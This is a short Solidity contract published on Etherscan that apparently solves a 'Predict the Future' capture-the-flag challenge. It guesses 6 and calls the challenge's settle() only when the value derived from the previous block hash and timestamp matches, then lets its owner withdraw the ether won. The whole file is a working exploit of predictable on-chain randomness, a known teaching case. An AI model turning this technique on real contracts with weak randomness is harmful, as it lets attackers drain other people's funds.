/**
 *Submitted for verification at Etherscan.io on 2021-11-23
*/

pragma solidity ^0.4.21;

interface PredictTheFutureChallenge {
    function settle() external;
    function lockInGuess(uint8 n) public payable;
}

contract checkHash {
    
    address public owner;
    
    constructor() {
        owner = msg.sender;
    }
    
    function() payable { }
    
    PredictTheFutureChallenge ptfc = PredictTheFutureChallenge(0xC148b31a58Dbb4EAB69d1CfE41B0A709B98feC17);
    
    function lockInGuessForSix() public payable {
        ptfc.lockInGuess.value(1 ether)(uint8(6));
    }
    
    function compute() public {
        require(uint8(keccak256(block.blockhash(block.number - 1), now)) % 10 == 6,"Not the correct number"); //I chose 6
        ptfc.settle();
    }
    
    function withdraw() public {
        require(msg.sender == owner);
        msg.sender.transfer(address(this).balance);
    }
}